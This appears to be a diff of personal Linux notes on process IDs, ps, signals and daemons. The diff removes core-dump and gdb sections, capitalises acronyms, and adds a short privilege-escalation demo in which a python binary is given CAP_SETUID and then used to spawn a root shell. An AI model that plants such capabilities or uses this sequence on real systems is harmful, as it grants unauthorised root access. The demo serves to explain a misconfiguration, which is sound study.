@@ -1,230 +1,54 @@
 # How is used
-## the real user ID (ruid) of a process?
+## the real user ID (RUID) of a process?
 
 It identifies  the real  owner of  the process and  affects the  permissions for
 sending signals.
 
-A process  without superuser privileges may  signal another process only  if the
-sender's ruid (or euid) matches receiver's ruid (or suid).
-Because a child  process inherits its ruid  from its parent, a  child and parent
-may signal each other.
+A process  without superuser privileges can  signal another process only  if the
+sender's RUID (or EUID) matches receiver's RUID (or SUID).
+Because a child  process inherits its RUID  from its parent, a  child and parent
+can signal each other.
 
 <https://en.wikipedia.org/wiki/User_identifier#Real_user_ID>
 
-## the effective user ID (euid) of a process?
+## the effective user ID (EUID) of a process?
 
 It's used for most access checks.
 It's also used as the owner for files created by that process.
 
 <https://en.wikipedia.org/wiki/User_identifier#Effective_user_ID>
 
-## the saved user ID (suid) of a process?
+## the Saved User ID (SUID) of a process?
 
 It's  used when  a process  running with  elevated privileges  needs to  do some
-unprivileged work temporarily; changing euid  from a privileged value (typically
-0) to some unprivileged value causes the privileged value to be stored in suid.
+unprivileged work temporarily; changing EUID  from a privileged value (typically
+0) to some unprivileged value causes the privileged value to be stored in SUID.
 
-Later, the process's euid  can be set back to the value stored  in suid, so that
+Later, the process's EUID  can be set back to the value stored  in SUID, so that
 elevated privileges can be restored.
 
 <https://en.wikipedia.org/wiki/User_identifier#Saved_user_ID>
 
 ##
-# How to print
-## all the limits imposed on the resources available to the shell and the processes started by it?
+# How can a misconfigured file capability let an attacker escalate privileges?
 
-    $ ulimit -a
-
-See `man bash /ulimit` for more info.
-
-##
-## the maximum size of a core file created when a process crash?
-
-    $ ulimit -c
-
-By default, this command will probably output 0.
-It means that if a process crashes, and tries to dump a core file, it won't be able to.
-
-### How to remove this limit?
-
-    $ ulimit -c unlimited
-
-The effect of this command doesn't persist beyond the life of the shell where it's run.
-
-##
-## apport
-
-    /proc/sys/kernel/core_pattern
-
-Par défaut, un  fichier “core dump“ est  nommé 'core', mais ce  peut être changé
-via un template défini dans `/proc/sys/kernel/core_pattern`.
-Atm, le mien contient:
-
-    |/usr/share/apport/apport %p %s %c %d %P %E
-
-Ici, le 1er caractère est un pipe.
-Ça indique  au kernel  qu'il ne  doit pas  écrire le  “core dump“  dans un
-fichier mais sur l'entrée standard du script `apport`.
-
-On peut aussi accéder à ce paramètre via `$ sysctl kernel.core_pattern`.
-Et on peut aussi – sans doute – le modifier en passant `-w` à `sysctl(8)`.
+    $ cd /tmp
+    $ cp "$(which python)" python
+    $ sudo setcap CAP_SETUID+ep python
+    $ ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+    # whoami
+    root
 
 ---
 
-Les items  `%` sont des  spécificateurs automatiquement remplacés  par certaines
-valeurs.  Pour plus d'infos lire `man core`.
+Note that this doesn't work on a filesystem mounted with the `nosuid` option.
+That's why it  doesn't work if you  run the previous commands  from under `/run`
+instead of `/tmp`, on Ubuntu 20.04:
 
----
+    $ grep '/run ' /proc/mounts
+    tmpfs /run tmpfs rw,nosuid,nodev,noexec,relatime,size=369988k,mode=755,inode64 0 0
+                        ^----^
 
-If you need to make tests, run this:
-
-    $ sleep 30
-
-Then, press `CTRL-\`.  It should cause `sleep(1)` to crash.
-If it doesn't, you might need to run:
-
-    $ stty quit '^\'
-
----
-
-For more info, see `~/wiki/vim/debug.md`, and look for the fold "Vim doesn't dump a core!".
-
-TODO: Merge this `apport` fold, and the next one (`gdb`) in `~/wiki/vim/debug.md`.
-Rationale: All this information is only useful to debug crashes, and we mostly work with Vim.
-If we have an issue with a crash, we'll probably look in `~/wiki/vim/debug.md` first.
-
-## gdb
-
-Si aucun  fichier `core`  n'est créé à  l'issu du crash,  reproduit le  crash en
-ayant lancé le processus via `sudo`.
-
-Et lit le contenu de `/var/log/apport.log`.
-Il se peut qu'il contienne un message d'erreur expliquant pourquoi le `core` n'a
-pas été dumpé, ou bien il peut fournir le chemin vers lequel il a été dumpé.
-
-
-         ┌ quiet: pas de messages d'intro / copyright
-         │
-    gdb -q build/bin/nvim core
-           ├─────────────────┘
-           └ Lance le  binaire nvim  en spécifiant  un fichier
-             `core` pour analyser un précédent crash.
-
-            ┌ exécute automatiquement la commande GDB qui suit (ici `bt`)
-            │
-    gdb -q -ex bt build/bin/nvim core
-               │
-               └ affiche le backtrace de  toutes les stack frames (taper `help
-                 bt` dans gdb pour + d'infos)
-
-                ┌ appliquer  la commande qui suit  (ici `bt`) à
-                │ tous les threads neovim est multi-thread
-                ├──────────────┐
-    gdb -q -ex 'thread apply all bt full' build/bin/nvim core
-                                    │
-                                    └ qualificateur qui demande à afficher les
-                                      valeurs des variables locales
-
-
-         ┌ n'exécute aucune commande d'un fichier d'initialisation `.gdbinit`
-         │
-    gdb -n -ex 'thread apply all bt full' -batch nvim core >backtrace.txt
-                                           │
-                                           └ mode batch (!= interactif):
-                                                  exécute les commandes demandées et affiche leur sortie
-                                                  dans le terminal
-                                             -batch implique `-q`
-
-
-Générer un backtrace à partir d'un fichier “core dump“.
-
-Qd un  processus reçoit certains  signaux, il crashe  et génère un  fichier core
-dump contenant une image de sa mémoire actuelle.
-Cette image peut être utilisée par un debugger tq `gdb` pour inspecter l'état du
-programme au moment où il s'est terminé.
-
-
-Si le  crash concerne un  binaire compilé mais  non installé, il  faut remplacer
-`nvim` par le chemin vers le binaire, typiquement:
-
-    ./build/bin/nvim
-
-
-La version `Release` ne génère pas d'informations de déboguage.
-En  cas   de  crash,  il  vaut   donc  mieux  le  reproduire   avec  la  version
-`RelWithDebInfo` et s'assurer  que la commande `gdb` invoque  bien cette version
-de nvim.
-
-See also: <https://github.com/neovim/neovim/wiki/FAQ#debug>
-
-Now, it's:
-
-    2>&1 coredumpctl -1 gdb | tee -a bt.txt
-    thread apply all bt full
-
-It doesn't need a core file, but you need to install the package `systemd-coredump`.
-
-You can find some of these gdb commands by cloning the neovim wiki:
-
-    $ git clone https://github.com/neovim/neovim.wiki
-
-Then, search for ‘gdb’ in the commit logs:
-
-    $ git log --all --source -p -S 'gdb' | vim -
-
-See also: <https://wiki.archlinux.org/index.php/Core_dump>
-
----
-
-Une frame est un ensemble de données associées à un appel de fonction.
-Elle contient:
-
-   - les arguments passés à la fonction
-
-   - ses variables locales
-
-   - son adresse d'exécution (≈ à quelle ligne de la fonction l'exécution se
-     trouve ?)
-
-On parle  de “stack frame“, car  une fonction peut  en appeler une autre,  et le
-processus peut se  répéter, formant ainsi une pile sur  laquelle s'ajoute chaque
-nouvelle frame.
-La frame  associée à  la fonction où  l'exécution se trouve,  est dite  “la plus
-profonde“ (innermost).
-
-Ce qui caractérise une stack n'est pas son implémentation (liste ou autre), mais
-son interface: on ne peut que “push“ ou “pop“ un item sur la stack.
-<https://en.wikipedia.org/wiki/Stack_(abstract_data_type)#Implementation>
-
----
-
-How to generate a core file on-demand?
-
-Start your process, and get its pid.
-Then, run:
-
-    $ gdb -p PID
-    generate-core-file
-
-<https://wiki.archlinux.org/index.php/Core_dump#Making_a_core_dump>
-
-##
-##
-##
-# How to kill the process responsible for a GUI window, without knowing its pid?
-
-    $ xkill
-    # hover your cursor on the window
-    # left-click on it
-
-The only thing that `xkill(1)` does, is to close the connection to the X server.
-There's no  guarantee that the application  will abort nicely, or  even abort at
-all.
-Many existing applications do indeed abort when their connection to the X server
-is closed, but some can choose to continue.
-
-##
-##
 ##
 # How to get
 ## the environment of the Vim process?  (2)
@@ -274,7 +98,7 @@ With the lifetime of a designated user process that the display manager invokes.
 ### In a kernel session, what is the session leader?
 
 A  process which  interacts with  the controlling  terminal to  ensure that  all
-programs are terminated when a user “hangs up” the terminal connection.
+programs are terminated when a user “hangs up the terminal connection.
 
 On our machine, atm, it seems the session leader is `upstart`:
 
@@ -317,7 +141,7 @@ It allows for a signal to be sent to several related processes simultaneously.
 It determines  what processes may  perform I/O to and  from the terminal  at any
 given time.
 
-It's  also the  process  group to  which  the tty  device  driver sends  signals
+It's  also the  process  group to  which  the TTY  device  driver sends  signals
 generated by keyboard interrupts, notably `C-C`, `C-Z` and `C-\`.
 
 #### Who sets it?
@@ -404,7 +228,7 @@ only displays processes owned by the current user.
 
 ### `x`
 
-When you use a BSD-style option, `ps(1)` only displays processes who have a tty.
+When you use a BSD-style option, `ps(1)` only displays processes who have a TTY.
 
 `x` removes this restriction.
 
@@ -440,7 +264,7 @@ Long lines are wrapped.
 You can also use `less(1)` to read long lines.
 
 ##
-## How to only print the effective user, pid, tty, state and command of all current processes?
+## How to only print the effective user, PID, TTY, state and command of all current processes?
 
     $ ps axfo user,pid,tty,stat,args
             ^----------------------^
@@ -450,7 +274,7 @@ You can also use `less(1)` to read long lines.
 want to see, and how they should be formatted.
 See `man ps /STANDARD FORMAT SPECIFIERS` for the full list of keywords you can use.
 
-### The header of the tty column is `TT`.  How to make `ps(1)` write `TTY` instead?
+### The header of the TTY column is `TT`.  How to make `ps(1)` write `TTY` instead?
 
 You  can populate  a  column header  with  an arbitrary  text  by suffixing  the
 relevant keyword with `=mytext`:
@@ -474,7 +298,7 @@ be wrongly interpreted as being part of the text in the column header:
     $ ps axfo user,pid,tty=TTY:13,stat,args
                               ^^^
                               would be  interpreted literally  as being  part of
-                              the column header for the tty keyword
+                              the column header for the TTY keyword
 
 ###
 ### How to suppress the output of the header line?
@@ -507,7 +331,7 @@ Use the `-u` option:
 
     $ ps -u root
 
-### the processes whose pid are 12, 34 and 56?
+### the processes whose PID are 12, 34 and 56?
 
 Use the `-p` option:
 
@@ -591,7 +415,7 @@ parses it as an ERE *regex*.
 Third, `pidof(8)` matches its argument against the full name of the *executable*,
 while `pgrep(1)` matches it against the *name of the process*.
 
-### Why does `$ pgrep firefox` only output one pid, while `$ pidof firefox` output several?
+### Why does `$ pgrep firefox` only output one PID, while `$ pidof firefox` output several?
 
 You probably have several firefox processes,  but only one contains 'firefox' in
 its name:
@@ -599,7 +423,7 @@ its name:
     $ ps xo fname | grep firefox
     firefox˜
 
-So `pgrep(1)` only prints the pid of the latter.
+So `pgrep(1)` only prints the PID of the latter.
 However, all of them were started from the 'firefox' executable:
 
     $ ps xo args | grep firefox
@@ -620,7 +444,7 @@ command-line of each process, and not just their name.
 
 Use the `-u root` argument.
 
-Only the euid is considered, not the ruid.
+Only the EUID is considered, not the RUID.
 
 ### whose parent has the PID 123, 456 or 789?
 
@@ -717,7 +541,7 @@ It  does only  if the  signal  handler for  SIGPIPE  has been  set to  `SIG_IGN`
 ##
 ## What happens when a process tries to read from the terminal or write to it, outside the foreground process group?
 
-The tty device driver sends to it the SIGTTIN (read) or SIGTTOU (write) signal.
+The TTY device driver sends to it the SIGTTIN (read) or SIGTTOU (write) signal.
 Unless caught, these signals make the process stop.
 
 Shells often  override the  default stop  action of  SIGTTOU so  that background
@@ -737,7 +561,7 @@ As an example, see `man xbindkeys /HUP`.
 
 ###
 ## How to send – in a single command – SIGKILL to
-### the processes whose pid are 123 and 456?
+### the processes whose PID are 123 and 456?
 
     $ kill -kill 123 456
 
@@ -836,7 +660,7 @@ It can be converted in binary, and interpreted like so:
 
 To  automate the  binary  conversion and  interpretation, we  have  a script  in
 `~/bin/signal.sh`.
-To use it, invoke it  on the command-line and pass it the pid  of a process as a
+To use it, invoke it  on the command-line and pass it the PID  of a process as a
 parameter:
 
     $ signal.sh $(pidof vim)
@@ -1080,8 +904,8 @@ Warning: This can create big files.
 
     $ strace -o log -ff firefox
                     ^^^
-                    each process's trace is written to `log.<pid>`
-                    where pid is the pid of the process
+                    each process's trace is written to log.<PID>
+                    where <PID> is the PID of the process
 
 ##
 ## How to make `strace(1)` add an absolute timestamp before each system call?
@@ -1194,7 +1018,7 @@ Study the PGID and the file descriptors of a process in a subshell vs in a scrip
 
 Is a subshell interactive?
 
-## Document `$ pkill -u toto`
+## Document `$ pkill --euid toto`
 
 Kills all processes whose EUID is toto.
 
@@ -1215,12 +1039,12 @@ Then, the kernel:
    - reparent its possible children to a subreaper or init
 
 At that moment, the child is a  zombie, because it has terminated but the kernel
-sill keeps some  info about it; notably,  its pid in the process  table, and its
+sill keeps some  info about it; notably,  its PID in the process  table, and its
 exit status.
 
 Then, the kernel sends SIGCHLD to the parent process.
 The latter should then collect the exit status via wait(2).
-Finally, the kernel removes the pid of the zombie from the process table.
+Finally, the kernel removes the PID of the zombie from the process table.
 
 See `man 2 exit`:
 
@@ -1258,8 +1082,8 @@ You can also hide/show the threads created by:
    - user processes by pressing `H`
    - kernel processes by pressing `K`
 
-What is shown in the column PID of htop is not always a pid.
-I think sometimes, it's a tid (thread id):
+What is shown in the column PID of htop is not always a PID.
+I think sometimes, it's a TID (Thread ID):
 
     $ ps -eLf | sed '/UID\|cmus/!d' | grep -v sed
 
@@ -1270,7 +1094,7 @@ Process id); see `man ps /lwp\s*LWP`.
    >                       dispatchable entity (alias spid, tid).  See tid
    >                       for additional information.
 
-However, things are confusing, because it seems that a tid can appear as a pid:
+However, things are confusing, because it seems that a TID can appear as a PID:
 
    > tid         TID       the unique number representing a dispatchable
    >                       entity (alias lwp, spid).  This value may also
@@ -1283,11 +1107,11 @@ However, things are confusing, because it seems that a tid can appear as a pid:
 Difference between PID and TID: <https://stackoverflow.com/a/8787888/9780968>
 
 Update: I think I get it.
-When you start a heavy process, its pid and tid are equal.
-But then,  if it spawns threads,  their tids are  different from the pid  of the
+When you start a heavy process, its PID and TID are equal.
+But then,  if it spawns threads,  their TIDs are  different from the PID  of the
 heavy process.
 You can check  this by looking at the  first line in the output  of the previous
-`ps(1)` command: the first cmus process has a  pid equal to its tid, but not the
+`ps(1)` command: the first cmus process has a  PID equal to its TID, but not the
 other threads.
 
 ---
@@ -1328,7 +1152,7 @@ Process Management (Processes and Threads): <https://www.youtube.com/watch?v=OrM
 
 ## ?
 
-Understand the output of `free -h`:
+Understand the output of `free --human`:
 
                    total       used        free      shared  buff/cache   available
     Mem:           3,6G        1,8G        408M        262M        1,4G        1,2G
@@ -1621,7 +1445,7 @@ How to reap a zombie?
     (gdb) call waitpid(PID, 0, 0)
     (gdb) quit
 
-PID is the pid of the zombie, and PPID is the pid of its parent.
+PID is the PID of the zombie, and PPID is the PID of its parent.
 
 <https://serverfault.com/a/101525>
 
@@ -1738,7 +1562,7 @@ immediately exiting,  thus causing init  to adopt the  child process, or  by the
 init process directly launching the daemon.
 In addition,  a daemon launched  by forking  and exiting typically  must perform
 other operations, such as dissociating the process from any controlling terminal
-(tty).  Such  procedures are often  implemented in various  convenience routines
+(TTY).  Such  procedures are often  implemented in various  convenience routines
 such as `daemon(3)`.
 
 Systems often start daemons at boot time which will respond to network requests,
@@ -1776,7 +1600,7 @@ SystemStarter script, involves:
      "half" of the fork).  This  allows daemon's  parent (shell  or  startup
      process)  to receive  exit notification and continue its normal execution.
 
-   - Dissociating from  the controlling tty
+   - Dissociating from  the controlling TTY
 
    - Creating a new session  and becoming the session leader of that session.
 
@@ -1785,10 +1609,10 @@ SystemStarter script, involves:
      setsid().
 
    - If  the daemon  wants  to  ensure that  it  won't  acquire a  new
-     controlling  tty even  by  accident  (which happens  when  a session
-     leader without a controlling tty opens a free tty), it may fork and exit
+     controlling  TTY even  by  accident  (which happens  when  a session
+     leader without a controlling TTY opens a free TTY), it may fork and exit
      again.  This means  that it is no  longer a session  leader in the new
-     session, and can't acquire a controlling tty.
+     session, and can't acquire a controlling TTY.
 
    - Setting the root directory (/) as  the current working directory so that
      the process does  not keep any directory  in use that  may be on
